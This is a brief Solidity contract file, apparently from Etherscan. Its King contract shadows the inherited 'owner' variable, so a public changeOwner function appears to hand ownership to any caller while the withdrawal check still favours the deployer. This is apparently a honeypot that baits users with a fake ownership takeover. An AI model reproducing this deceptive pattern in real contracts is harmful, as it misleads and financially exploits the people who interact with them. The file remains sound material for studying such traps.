/**
 *Submitted for verification at Etherscan.io on 2024-12-15
*/

pragma solidity ^0.4.11;

contract Ownable {
    address public owner = msg.sender;
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}

contract King is Ownable {
    address public owner;

    function King() public payable { 
        owner = msg.sender;
    }

    function changeOwner() public { 
        owner = msg.sender;
    }

    function takeAll() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
}